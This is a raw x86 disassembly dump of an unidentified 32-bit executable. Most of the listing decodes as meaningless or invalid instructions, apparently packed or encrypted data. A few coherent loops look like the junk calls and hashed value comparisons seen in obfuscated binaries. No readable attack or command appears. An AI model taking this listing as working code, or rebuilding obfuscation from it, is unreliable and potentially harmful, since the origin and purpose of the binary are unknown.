  40eb6f:	mov    DWORD PTR ds:0x4337e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43379b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43382b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    bl,ch
  40ebb4:	cmp    esi,ebx
  40ebb6:	lds    ebx,FWORD PTR [edx+0x547e7ea5]
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40ebd8
  40ebc0:	mov    ah,BYTE PTR [esi+edx*4+0x28]
  40ebc4:	fs ror edx,cl
  40ebc7:	pop    ebp
  40ebc8:	inc    esi
  40ebc9:	add    al,0xbc
  40ebcb:	mov    ecx,0xeada6c68
  40ebd0:	data16 data16 cmc 
  40ebd3:	adc    al,0x40
  40ebd5:	and    cl,ch
  40ebd7:	push   ds
  40ebd8:	cmp    eax,0xaf27f34d
  40ebdd:	pop    ds
  40ebde:	in     eax,dx
  40ebdf:	sbb    al,BYTE PTR [eax-0x1]
  40ebe2:	sub    al,0xc7
  40ebe4:	ss pop es
  40ebe6:	mov    esi,0x96189fd6
  40ebeb:	and    esi,DWORD PTR [edx]
  40ebed:	mov    al,ds:0x57ef6525
  40ebf2:	mov    esi,0xc4c12a0e
  40ebf7:	dec    edi
  40ebf8:	sbb    ah,BYTE PTR [edi-0x6c]
  40ebfb:	mov    eax,0x8a655954
  40ec00:	outs   dx,DWORD PTR ds:[esi]
  40ec01:	std    
  40ec02:	push   ecx
  40ec03:	push   ebp
  40ec04:	lea    esp,ds:0x7bf5c732
  40ec0a:	dec    ebx
  40ec0b:	xor    eax,0xb2c83bca
  40ec10:	ret    
  40ec11:	push   ss
  40ec12:	mov    ch,0xc3
  40ec14:	loope  0x40ec08
  40ec16:	test   BYTE PTR [edi+0x43],0x17
  40ec1a:	push   ds
  40ec1b:	scas   al,BYTE PTR es:[edi]
  40ec1c:	inc    edx
  40ec1d:	pop    ecx
  40ec1e:	push   0x82273509
  40ec23:	rcr    BYTE PTR [esi],cl
  40ec25:	addr16 and eax,0x3bad8433
  40ec2b:	jmp    0x40eca3
  40ec2d:	pop    esp
  40ec2e:	mov    ebx,0xd667f712
  40ec33:	push   ecx
  40ec34:	cld    
  40ec35:	dec    ecx
  40ec36:	div    DWORD PTR [ebx-0x6f]
  40ec39:	adc    eax,0xdccc3244
  40ec3e:	test   BYTE PTR [ecx-0x63e29ba7],dh
  40ec44:	pushf  
  40ec45:	jb     0x40ec87
  40ec47:	mov    bl,0x90
  40ec49:	xchg   esi,eax
  40ec4a:	or     edi,ebp
  40ec4c:	and    DWORD PTR [ecx-0x42],edx
  40ec4f:	inc    edx
  40ec50:	push   sp
  40ec52:	push   ecx
  40ec53:	icebp  
  40ec54:	dec    ebx
  40ec55:	lahf   
  40ec56:	dec    ebx
  40ec57:	jl     0x40ec1c
  40ec59:	mov    edx,ds
  40ec5b:	pop    ebx
  40ec5c:	push   ss
  40ec5d:	jns    0x40ec4b
  40ec5f:	mov    ebp,0x76e8036c
  40ec64:	stos   BYTE PTR es:[edi],al
  40ec65:	adc    al,0x2e
  40ec67:	rcr    BYTE PTR [eax+eiz*1-0x414b6214],1
  40ec6e:	adc    cl,bl
  40ec70:	loop   0x40ecc0
  40ec72:	mov    al,0x53
  40ec74:	xchg   esp,eax
  40ec75:	sahf   
  40ec76:	dec    eax
  40ec77:	int3   
  40ec78:	inc    esi
  40ec79:	lods   al,BYTE PTR ds:[esi]
  40ec7a:	push   es
  40ec7b:	or     DWORD PTR [edi],0x1570a2a3
  40ec81:	ret    
  40ec82:	in     eax,0x38
  40ec84:	and    ebx,esp
  40ec86:	test   cl,ch
  40ec88:	inc    ch
  40ec8a:	adc    dl,ch
  40ec8c:	aas    
  40ec8d:	rcl    DWORD PTR [esp+ebx*8],0xf4
  40ec91:	rcr    DWORD PTR [eax+0x7a],0xda
  40ec95:	imul   eax,esi,0xcc0687eb
  40ec9b:	pop    es
  40ec9c:	imul   ebx,ebp,0x18
  40ec9f:	jns    0x40ecdc
  40eca1:	lods   eax,DWORD PTR ds:[esi]
  40eca2:	mov    bh,0xe
  40eca4:	xchg   ebx,eax
  40eca5:	hlt    
  40eca6:	and    al,0x74
  40eca8:	push   0x55
  40ecaa:	xlat   BYTE PTR ds:[ebx]
  40ecab:	xchg   ebx,eax
  40ecac:	inc    ecx
  40ecad:	sub    eax,0xd9553ac7
  40ecb2:	les    eax,FWORD PTR [ebx+0x4a37878e]
  40ecb8:	retf   0xb241
  40ecbb:	(bad)  
  40ecbc:	hlt    
  40ecbd:	xor    al,0xa8
  40ecbf:	jle    0x40eced
  40ecc1:	pop    esp
  40ecc2:	sti    
  40ecc3:	inc    eax
  40ecc4:	jo     0x40ec46
  40ecc6:	cmp    eax,0x2b75a339
  40eccb:	test   DWORD PTR [ecx+0x260cdf9d],esi
  40ecd1:	ja     0x40ecef
  40ecd3:	scas   al,BYTE PTR es:[edi]
  40ecd4:	arpl   dx,si
  40ecd6:	mov    edi,0xedbe42d0
  40ecdb:	sbb    esi,DWORD PTR [edi+eax*2-0x53]
  40ecdf:	js     0x40ecd9
  40ece1:	(bad)  
  40ece2:	pop    edi
  40ece3:	mov    cl,0xaf
  40ece5:	(bad)  
  40ece6:	icebp  
  40ece7:	arpl   WORD PTR ds:0xf25f1dfd,bp
  40eced:	add    eax,0x5f55b191
  40ecf2:	jmp    0x40ed0c
  40ecf4:	jl     0x40ed0f
  40ecf6:	push   edi
  40ecf7:	jo     0x40ecd9
  40ecf9:	xor    cl,dh
  40ecfb:	mov    esp,0xdb0a065f
  40ed00:	xchg   ebp,eax
  40ed01:	jb     0x40ecf9
  40ed03:	gs call 0xa7f3101d
  40ed09:	test   BYTE PTR gs:[edx],dh
  40ed0c:	dec    edx
  40ed0d:	push   edi
  40ed0e:	or     al,0x1d
  40ed10:	xlat   BYTE PTR ds:[ebx]
  40ed11:	cmp    DWORD PTR [edi-0x72b43e86],esi
  40ed17:	and    BYTE PTR fs:[ebx+ecx*1+0x7b],0xdc
  40ed1d:	sti    
  40ed1e:	scas   al,BYTE PTR es:[edi]
  40ed1f:	rol    BYTE PTR [esi-0xb83da18],cl
  40ed25:	mov    ecx,0x99a2230e
  40ed2a:	sub    BYTE PTR [ebx+0x77],dh
  40ed2d:	adc    edi,DWORD PTR fs:[edx-0x37]
  40ed31:	push   ds
  40ed32:	jg     0x40ed72
  40ed34:	jmp    0x7b4075bb
  40ed39:	mov    ebp,0xae11bf83
  40ed3e:	daa    
  40ed3f:	inc    esi
  40ed40:	outs   dx,DWORD PTR ds:[esi]
  40ed41:	inc    ecx
  40ed42:	or     DWORD PTR [ecx-0x7d],0x46
  40ed46:	add    ebx,DWORD PTR [esi+eiz*2]
  40ed49:	in     eax,dx
  40ed4a:	dec    edi
  40ed4b:	cmp    eax,0x84d98a12
  40ed50:	pop    ebx
  40ed51:	add    ah,BYTE PTR [esp+esi*2]
  40ed54:	aas    
  40ed55:	mov    esp,0xccae3634
  40ed5a:	out    0xa5,eax
  40ed5c:	loopne 0x40ed82
  40ed5e:	or     esp,eax
  40ed60:	push   es
  40ed61:	(bad)  
  40ed62:	pop    esi
  40ed63:	pop    ebp
  40ed64:	mov    ds:0x4b4c7fa8,eax
  40ed69:	jge    0x40edda
  40ed6b:	inc    ebx
  40ed6c:	push   esi
  40ed6d:	dec    edi
  40ed6e:	jp     0x40ede3
  40ed70:	(bad)  
  40ed71:	call   DWORD PTR [eax+0x53]
  40ed74:	cmp    esp,edx
  40ed76:	repnz out 0xa6,al
  40ed79:	mov    ds,WORD PTR ds:0x77b584ba
  40ed7f:	call   0x16d6cef8
  40ed84:	shl    BYTE PTR [edi+0x7f8c6c89],1
  40ed8a:	push   ecx
  40ed8b:	and    bh,BYTE PTR [ebx-0x3b]
  40ed8e:	xchg   ebx,eax
  40ed8f:	stc    
  40ed90:	sahf   
  40ed91:	add    BYTE PTR [ecx],dl
  40ed93:	cwde   
  40ed94:	jmp    FWORD PTR [eax+eiz*4-0x80]
  40ed98:	add    al,0x33
  40ed9a:	ret    0xd2b
  40ed9d:	push   ebx
  40ed9e:	aaa    
  40ed9f:	inc    ebx
  40eda0:	add    BYTE PTR [ebx],dh
  40eda2:	repnz mov DWORD PTR ds:0x4337d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4337d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4337d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4337d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4337d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x3408e737]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	inc    esi
  40ee77:	imul   edi,DWORD PTR ds:0xf7ce1623,0xffffffe1
  40ee7e:	int    0xeb
  40ee80:	sti    
  40ee81:	lea    ebp,[ebx+0x488e0eff]
  40ee87:	(bad)
  40ee8a:	push   0xffffffaa
  40ee8c:	maskmovq mm7,mm0
  40ee8f:	lea    esi,[eax-0x40913afd]
  40ee95:	mov    bh,0xbd
  40ee97:	jp     0x40ef09
  40ee99:	and    bl,BYTE PTR [edx]
  40ee9b:	jecxz  0x40eee4
  40ee9d:	(bad)  
  40ee9e:	das    
  40ee9f:	pop    eax
  40eea0:	push   eax
  40eea1:	mov    eax,ds:0xf0c403d9
  40eea6:	jmp    0xf6abc96d
  40eeab:	fst    QWORD PTR [ebx+0xa]
  40eeae:	push   esp
  40eeaf:	mov    BYTE PTR [esi+0x60],bh
  40eeb2:	mov    ds:0x1293cd9a,eax
  40eeb8:	loopne 0x40eea8
  40eeba:	enter  0x5ede,0xb3
  40eebe:	mov    al,0x33
  40eec0:	ins    DWORD PTR es:[edi],dx
  40eec1:	(bad)  
  40eec2:	sbb    DWORD PTR [eax-0x23],ecx
  40eec5:	(bad)  
  40eec6:	scas   al,BYTE PTR es:[edi]
  40eec7:	mov    ds:0x813e725b,eax
  40eecc:	(bad)  
  40eecd:	fwait
  40eece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eecf:	xor    dl,bl
  40eed1:	sub    esp,DWORD PTR [edx+0x75]
  40eed4:	icebp  
  40eed5:	mov    dh,0x90
  40eed7:	or     DWORD PTR [edx-0x4365739b],edx
  40eedd:	push   eax
  40eede:	pop    edi
  40eedf:	mov    cl,0xeb
  40eee1:	and    al,0xa9
  40eee3:	sub    eax,DWORD PTR [eax+edi*2+0x54]
  40eee7:	mov    ebx,0x62f999b4
  40eeec:	pop    ebx
  40eeed:	scas   eax,DWORD PTR es:[edi]
  40eeee:	adc    eax,0xd716c681
  40eef3:	jne    0x40ee9f
  40eef5:	inc    eax
  40eef6:	cmp    eax,0xac26394b
  40eefb:	test   BYTE PTR [edx+0x57b0af4d],ch
  40ef01:	cli    
  40ef02:	into   
  40ef03:	fdiv   DWORD PTR [ebp-0x59]
  40ef06:	fs push esi
  40ef08:	test   DWORD PTR [ebx],edx
  40ef0a:	mov    ebp,0xc1d44d69
  40ef0f:	add    eax,0x416dc18f
  40ef14:	les    esi,FWORD PTR [ebx+eax*4-0x56]
  40ef18:	stos   DWORD PTR es:[edi],eax
  40ef19:	sbb    DWORD PTR [eax+esi*2-0x42],edi
  40ef1d:	out    0x34,eax
  40ef1f:	inc    ebx
  40ef20:	adc    DWORD PTR [edi-0x43],edi
  40ef23:	or     esp,ebx
  40ef25:	adc    al,0xc
  40ef27:	div    edi
  40ef29:	aad    0x67
  40ef2b:	push   es
  40ef2c:	lods   al,BYTE PTR ds:[esi]
  40ef2d:	xchg   edx,eax
  40ef2e:	xchg   edx,eax
  40ef2f:	div    BYTE PTR [ecx]
  40ef31:	sahf   
  40ef32:	or     BYTE PTR [esi],ch
  40ef34:	popf   
  40ef35:	mov    fs,ebp
  40ef37:	in     eax,dx
  40ef38:	cwde   
  40ef39:	cs adc eax,0xc6bdd474
  40ef3f:	xchg   ecx,eax
  40ef40:	push   cs
  40ef41:	cwde   
  40ef42:	fsubr  QWORD PTR [eax+0x28]
  40ef45:	enter  0x69c7,0xff
  40ef49:	aad    0x3
  40ef4b:	jge    0x40efc8
  40ef4d:	enter  0xd6b9,0x52
  40ef51:	mov    bh,BYTE PTR [edx]
  40ef53:	mov    DWORD PTR [ecx-0x5ac9692b],ebp
  40ef59:	lods   eax,DWORD PTR ds:[esi]
  40ef5a:	in     eax,dx
  40ef5b:	mov    esp,0x4dbcf25c
  40ef61:	fadd   QWORD PTR [eiz*4+0x2fbf302a]
  40ef68:	call   0xbc605357
  40ef6d:	dec    eax
  40ef6e:	lahf   
  40ef6f:	int    0xef
  40ef71:	aaa    
  40ef72:	test   al,0x8e
  40ef74:	rcl    DWORD PTR [esi+0x42],1
  40ef77:	dec    esi
  40ef78:	int    0xad
  40ef7a:	sbb    dh,BYTE PTR [edx+0x589160a1]
  40ef80:	packssdw mm4,QWORD PTR [ebx]
  40ef83:	(bad)  
  40ef84:	sbb    eax,0xa7bca90
  40ef89:	in     eax,0x1e
  40ef8b:	dec    ebx
  40ef8c:	push   ebp
  40ef8d:	cwde   
  40ef8e:	aad    0x85
  40ef90:	and    ebp,DWORD PTR [edx-0x28]
  40ef93:	call   DWORD PTR [ecx-0x560a664]
  40ef99:	push   0xffffffb9
  40ef9b:	in     eax,0xc5
  40ef9d:	inc    edx
  40ef9e:	inc    esi
  40ef9f:	mov    edi,DWORD PTR [esp+eax*8+0x78]
  40efa3:	jbe    0x40f003
  40efa5:	out    0x6f,al
  40efa7:	bound  edi,QWORD PTR [ebx-0x1e3d436]
  40efad:	cmp    DWORD PTR [edx+edi*8+0x72],0x42
  40efb2:	jb     0x40eff3
  40efb4:	push   edi
  40efb5:	adc    BYTE PTR [edx-0x6d107d8d],bh
  40efbb:	fld    DWORD PTR [ebx]
  40efbd:	cmp    BYTE PTR [ebp-0x772b938b],ah
  40efc3:	aad    0x50
  40efc5:	push   esi
  40efc6:	mov    esp,0x41b4716e
  40efcb:	pop    esp
  40efcc:	cmc    
  40efcd:	ds inc edi
  40efcf:	sub    BYTE PTR [ecx-0x42],0x4d
  40efd3:	repz shl BYTE PTR [ebx-0x28],cl
  40efd7:	add    bh,dh
  40efd9:	or     al,0x33
  40efdb:	xor    al,BYTE PTR [ecx]
  40efdd:	jle    0x40efa6
  40efdf:	mov    ds:0x5d6b4a1e,al
  40efe4:	js     0x40eff8
  40efe6:	ja     0x40f057
  40efe8:	pop    eax
  40efe9:	or     ch,dh
  40efeb:	mov    dh,0x5c
  40efed:	push   0xffffff8f
  40efef:	ret    0x5b71
  40eff2:	outs   dx,DWORD PTR ds:[esi]
  40eff3:	bound  ebx,QWORD PTR [edi-0x122086c7]
  40eff9:	cmp    edx,DWORD PTR [ebp-0x42108bb3]
  40efff:	les    ebx,FWORD PTR ds:0x85a33f
  40f005:	cmp    BYTE PTR [edi+ebx*1-0x7a],bl
  40f009:	cdq    
  40f00a:	push   edi
  40f00b:	and    eax,0x39849ac6
  40f010:	shl    DWORD PTR [edx+0x4a],1
  40f013:	mov    ch,0x57
  40f015:	es pop ebp
  40f017:	hlt    
  40f018:	dec    ebp
  40f019:	scas   al,BYTE PTR es:[edi]
  40f01a:	clc    
  40f01b:	outs   dx,DWORD PTR ds:[esi]
  40f01c:	aas    
  40f01d:	and    BYTE PTR [edx-0x4b],0x42
  40f021:	sti    
  40f022:	xor    eax,DWORD PTR [eax+0x4bb76d5d]
  40f028:	sub    DWORD PTR [eax],eax
  40f02a:	cmp    eax,DWORD PTR [ebx-0x38f448cc]
  40f030:	mov    edx,0xf0acaaf6
  40f035:	inc    eax
  40f036:	jno    0x40f0af
  40f038:	adc    al,0x8f
  40f03a:	sbb    al,0x7
  40f03c:	sbb    BYTE PTR [esi],al
  40f03e:	adc    eax,0xdcd5b22c
  40f043:	rol    DWORD PTR [ecx],cl
  40f045:	inc    esp
  40f046:	push   esi
  40f047:	test   al,0xca
  40f049:	mov    ds:0xb3d843a6,al
  40f04e:	sub    BYTE PTR [ebx-0x75],0x45
  40f052:	or     al,0x5e
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43379b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x90e01594,ebx
  40f076:	stos   DWORD PTR es:[edi],eax
  40f077:	outs   dx,BYTE PTR ds:[esi]
  40f078:	(bad)  
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	pop    edx
  40f081:	push   edi
  40f082:	sub    esp,DWORD PTR [ecx+0x7b53adfb]
  40f088:	arpl   WORD PTR [eax+0x22],bp
  40f08b:	fxch   st(4)
  40f08d:	push   ss
  40f08e:	cmp    BYTE PTR [ebx],0xdb
  40f091:	lea    esi,[eax+0x323efc5b]
  40f097:	das    
  40f098:	jmp    0xc61b091f
  40f09d:	mov    ds:0xd68102c,eax
  40f0a2:	pop    edi
  40f0a3:	aaa    
  40f0a4:	cmp    edx,DWORD PTR [ebx+0x655c80fd]
  40f0aa:	mov    eax,0xd66bdf63
  40f0af:	(bad)  
  40f0b0:	loope  0x40f118
  40f0b2:	inc    edi
  40f0b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0b4:	and    BYTE PTR fs:[esi-0x8],al
  40f0b8:	add    cl,bl
  40f0ba:	outs   dx,DWORD PTR ds:[esi]
  40f0bb:	js     0x40f108
  40f0bd:	stos   BYTE PTR es:[edi],al
  40f0be:	push   cs
  40f0bf:	jg     0x40f069
  40f0c1:	push   0x6c9e75f3
  40f0c6:	dec    ebx
  40f0c7:	out    dx,eax
  40f0c8:	xor    BYTE PTR [esi+0x36],ah
  40f0cb:	mov    dh,0xba
  40f0cd:	sbb    DWORD PTR [ecx-0x15],edx
  40f0d0:	aas    
  40f0d1:	sub    ch,dh
  40f0d3:	pop    ds
  40f0d4:	xor    DWORD PTR [eax+0x739568eb],ebx
  40f0da:	out    dx,eax
  40f0db:	and    al,0x3e
  40f0dd:	test   cl,dl
  40f0df:	push   esp
  40f0e0:	add    DWORD PTR [ebp+0x4a],esp
  40f0e3:	jmp    0x40f114
  40f0e5:	fcom   st(5)
  40f0e7:	sub    esp,DWORD PTR [eax+0x85924aa]
  40f0ed:	mov    WORD PTR [edx],es
  40f0ef:	jns    0x40f0b0
  40f0f1:	xor    BYTE PTR [ecx-0x37],ch
  40f0f4:	add    BYTE PTR [edi+0x72],cl
  40f0f7:	add    ebp,esi
  40f0f9:	aaa    
  40f0fa:	(bad)
  40f0fd:	dec    ebp
  40f0fe:	adc    DWORD PTR [edi-0x774fcce6],esi
  40f104:	cdq    
  40f105:	bound  ebp,QWORD PTR [esi-0x68]
  40f108:	cli    
  40f109:	shl    BYTE PTR [ecx],cl
  40f10b:	stos   BYTE PTR es:[edi],al
  40f10c:	lahf   
  40f10d:	enter  0xe25f,0x70
  40f111:	gs es push edx
  40f114:	mov    ah,0x28
  40f116:	mov    ebx,0x8ed0c1a4
  40f11b:	ins    BYTE PTR es:[edi],dx
  40f11c:	popf   
  40f11d:	fisubr DWORD PTR [esi-0x33ff451a]
  40f123:	inc    esp
  40f124:	xlat   BYTE PTR ds:[ebx]
  40f125:	out    0xc8,eax
  40f127:	inc    edi
  40f128:	aad    0x7a
  40f12a:	pusha  
  40f12b:	lea    ebx,[edi-0x6ff59b70]
  40f131:	sub    DWORD PTR [ebp+0x65],0x35
  40f135:	xchg   edi,eax
  40f136:	mov    ecx,0xdba53d
  40f13b:	out    dx,al
  40f13c:	lods   al,BYTE PTR ds:[esi]
  40f13d:	out    0xe0,al
  40f13f:	inc    edi
  40f140:	mov    esp,DWORD PTR [edi]
  40f142:	fwait
  40f143:	pop    es
  40f144:	je     0x40f18e
  40f146:	sbb    esp,DWORD PTR [edi+0x48]
  40f149:	and    eax,0xe36bc744
  40f14e:	mov    ds:0x21f9e556,eax
  40f153:	xor    eax,0xe20cbb4
  40f158:	mov    cl,0xdc
  40f15a:	mov    bh,0xd4
  40f15c:	push   ss
  40f15d:	shl    DWORD PTR [ebp-0x18e27c38],1
  40f163:	cli    
  40f164:	mov    al,ds:0x7c871012
  40f169:	cmp    eax,0x2cccc644
  40f16e:	neg    BYTE PTR [ebx+edx*2-0x44198240]
  40f175:	cs into 
  40f177:	xchg   edx,eax
  40f178:	scas   eax,DWORD PTR es:[edi]
  40f179:	sub    al,0x28
  40f17b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f17c:	xchg   esp,eax
  40f17d:	out    0x1f,eax
  40f17f:	xor    bl,ah
  40f181:	imul   esi,DWORD PTR [esi+eiz*4-0x24],0x6e
  40f186:	ins    BYTE PTR es:[edi],dx
  40f187:	add    bh,0x8
  40f18a:	sbb    ah,BYTE PTR [esi-0x29d0077a]
  40f190:	lods   al,BYTE PTR ds:[esi]
  40f191:	gs push ss
  40f193:	(bad)
  40f196:	(bad)
  40f19b:	jo     0x40f1e8
  40f19d:	rcl    BYTE PTR [edi+0x17],1
  40f1a0:	sub    BYTE PTR [ecx-0x5daf59b3],0x9f
  40f1a7:	or     eax,0x37846b14
  40f1ac:	(bad)  
  40f1ad:	mov    ds:0xe0458249,al
  40f1b2:	js     0x40f195
  40f1b4:	into   
  40f1b5:	ror    BYTE PTR [edx-0x6537c7c8],1
  40f1bb:	adc    DWORD PTR [esi],esi
  40f1bd:	in     al,dx
  40f1be:	mov    ds:0xfffcc66e,al
  40f1c3:	retf   0xd0de
  40f1c6:	push   0xd768fe67
  40f1cb:	adc    esp,ebp
  40f1cd:	xchg   DWORD PTR [eax+0x3ca92b57],ebp
  40f1d3:	dec    edx
  40f1d4:	pop    esi
  40f1d5:	aad    0x8e
  40f1d7:	push   ds
  40f1d8:	push   ebx
  40f1d9:	pop    edx
  40f1da:	cmp    DWORD PTR [edx+esi*2-0xf],edi
  40f1de:	ins    BYTE PTR es:[edi],dx
  40f1df:	out    0xcd,eax
  40f1e1:	out    dx,al
  40f1e2:	test   eax,0x277d144a
  40f1e7:	inc    ebp
  40f1e8:	push   0x66
  40f1ea:	sbb    eax,0x1499b344
  40f1ef:	jnp    0x40f199
  40f1f1:	or     eax,0xe41c8de2
  40f1f6:	push   esp
  40f1f7:	inc    edi
  40f1f8:	call   0xeda094c7
  40f1fd:	in     al,0xb0
  40f1ff:	clc    
  40f200:	pop    ds
  40f201:	push   ebp
  40f202:	adc    DWORD PTR [esi+edi*2-0x69],0x860429cc
  40f20a:	cmp    ch,BYTE PTR [edx-0xd3a8561]
  40f210:	jl     0x40f28f
  40f212:	aam    0xd5
  40f214:	cld    
  40f215:	lods   eax,DWORD PTR ds:[esi]
  40f216:	cmp    DWORD PTR [eax-0x4cfc2b74],esp
  40f21c:	ror    edx,1
  40f21e:	ficom  DWORD PTR [ecx]
  40f220:	push   ds
  40f221:	ror    BYTE PTR [esi-0x5d87ea5b],1
  40f227:	jne    0x40f231
  40f229:	inc    edx
  40f22a:	clc    
  40f22b:	and    esi,DWORD PTR [ecx+0xea669d0]
  40f231:	jmp    0x8694:0x80526bf
  40f238:	mov    eax,0x86907008
  40f23d:	and    eax,0xffffffad
  40f240:	fist   DWORD PTR ds:0xfe0c6aeb
  40f246:	sub    al,0x1d
  40f248:	push   edx
  40f249:	or     dl,ch
  40f24b:	cwde   
  40f24c:	cmp    DWORD PTR [ecx],0x7170660c
  40f252:	mov    eax,0xc6ea6a34
  40f257:	imul   esp,ebp,0xffffffc1
  40f25a:	push   ss
  40f25b:	dec    ecx
  40f25c:	mov    WORD PTR [ebx-0x124f439e],ss
  40f262:	mov    edi,ebx
  40f264:	(bad)  
  40f265:	(bad)  
  40f266:	cli    
  40f267:	je     0x40f2ce
  40f269:	(bad)  
  40f26a:	es pop ds
  40f26c:	add    eax,0x3183c348
  40f271:	rol    DWORD PTR [ebp+0x46d43111],cl
  40f277:	in     al,0xfe
  40f279:	rol    BYTE PTR [eax],cl
  40f27b:	add    al,0x43
  40f27d:	jne    0x40f2ac
  40f27f:	sar    BYTE PTR [eax+0x441e6112],0x52
  40f286:	inc    edx
  40f287:	xchg   ebx,eax
  40f288:	les    ebx,FWORD PTR [esi]
  40f28a:	mov    ds:0xa983fa92,eax
  40f28f:	mov    ds:0xe88c4f21,al
  40f294:	dec    ecx
  40f295:	scas   al,BYTE PTR es:[edi]
  40f296:	or     BYTE PTR [eax+ebx*1+0x607102b2],bh
  40f29d:	pop    ecx
  40f29e:	loop   0x40f246
  40f2a0:	mov    al,bh
  40f2a2:	mov    cl,0x99
  40f2a4:	stos   DWORD PTR es:[edi],eax
  40f2a5:	mov    ss,WORD PTR [ecx+0x38]
  40f2a8:	js     0x40f2b3
  40f2aa:	mov    ah,0xeb
  40f2ac:	pusha  
  40f2ad:	bound  esi,QWORD PTR ds:0xd4416818
  40f2b3:	jnp    0x40f247
  40f2b5:	mov    ebp,0xe9f5c41d
  40f2ba:	ficomp WORD PTR [esi-0x57]
  40f2bd:	pushf  
  40f2be:	sub    dl,BYTE PTR [esi-0x3f]
  40f2c1:	pop    esi
  40f2c2:	popf   
  40f2c3:	mov    ds:0x6f14bb66,al
  40f2c8:	in     al,0x4f
  40f2ca:	fimul  DWORD PTR [edi-0x35]
  40f2cd:	pop    esi
  40f2ce:	add    ebx,DWORD PTR [edi+0x25]
  40f2d1:	lea    ebx,[esi+0x23]
  40f2d4:	lea    esp,[ebx]
  40f2d6:	rol    bh,0x5f
  40f2d9:	dec    esi
  40f2da:	sub    BYTE PTR [ebx],bh
  40f2dc:	stc    
  40f2dd:	add    DWORD PTR [eax],edx
  40f2df:	dec    ebp
  40f2e0:	aaa    
  40f2e1:	cli    
  40f2e2:	sub    cl,BYTE PTR ds:0x52a0088f
  40f2e8:	stos   BYTE PTR es:[edi],al
  40f2e9:	jecxz  0x40f35d
  40f2eb:	lds    edx,FWORD PTR [esi-0x71]
  40f2ee:	lock mov eax,0x53493130
  40f2f4:	stc    
  40f2f5:	sub    DWORD PTR [ebp+0x72],0xffffffa9
  40f2f9:	mov    edi,DWORD PTR [ecx+0x21941078]
  40f2ff:	inc    edi
  40f300:	fisttp WORD PTR [ebx-0x4223c419]
  40f306:	ror    DWORD PTR [edx],0x44
  40f309:	xchg   ebx,eax
  40f30a:	mov    ds:0x69c2fef6,eax
  40f30f:	je     0x40f2e2
  40f311:	test   BYTE PTR [ebx],bh
  40f313:	inc    edi
  40f314:	das    
  40f315:	or     BYTE PTR [ecx-0x6a],dl
  40f318:	fldcw  WORD PTR [ebx]
  40f31a:	and    al,0x67
  40f31c:	fs daa 
  40f31e:	cmp    BYTE PTR [edx-0x3],cl
  40f321:	into   
  40f322:	pop    esi
  40f323:	or     ch,BYTE PTR [esi+esi*8+0x7dc9836]
  40f32a:	inc    ebp
  40f32b:	push   ecx
  40f32c:	les    ebp,FWORD PTR [eax+0x64]
  40f32f:	shl    DWORD PTR [edx-0x58],0x4d
